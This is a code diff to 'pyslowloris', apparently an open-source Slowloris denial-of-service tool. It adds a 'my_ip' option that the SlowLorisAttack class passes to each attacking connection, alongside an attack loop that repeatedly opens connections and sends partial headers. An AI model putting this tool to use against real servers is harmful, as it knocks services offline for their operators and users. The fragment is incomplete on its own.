@@ -31,18 +31,19 @@ from pyslowloris import exceptions as exc
 
 
 class SlowLorisAttack:
-    __slots__ = ("_target", "_silent", "_connections_count", "_sleep_time", )
+    __slots__ = ("_target", "_silent", "_connections_count", "_sleep_time", "_my_ip", )
 
     DEFAULT_SLEEP_TIME = 2
     DEFAULT_RANDOM_RANGE = [1, 999999]
 
     def __init__(
-        self, target: HostAddress, connections_count: int,
-        *, sleep_time: int = None, silent: bool = True
+        self, target: HostAddress, connections_count: int, my_ip: str = None,
+        *, sleep_time: int = None, silent: bool = True,
     ):
         self._target = target
         self._silent = silent
         self._connections_count = connections_count
+        self._my_ip = my_ip
         self._sleep_time = sleep_time or self.DEFAULT_SLEEP_TIME
 
     def __repr__(self) -> str:
@@ -53,7 +54,7 @@ class SlowLorisAttack:
     async def _atack_coroutine(self) -> None:
         while True:
             try:
-                conn = SlowLorisConnection(self._target)
+                conn = SlowLorisConnection(self._target, my_ip=self._my_ip)
                 await conn.establish_connection()
                 async with conn.with_stream():
                     await conn.send_initial_headers()
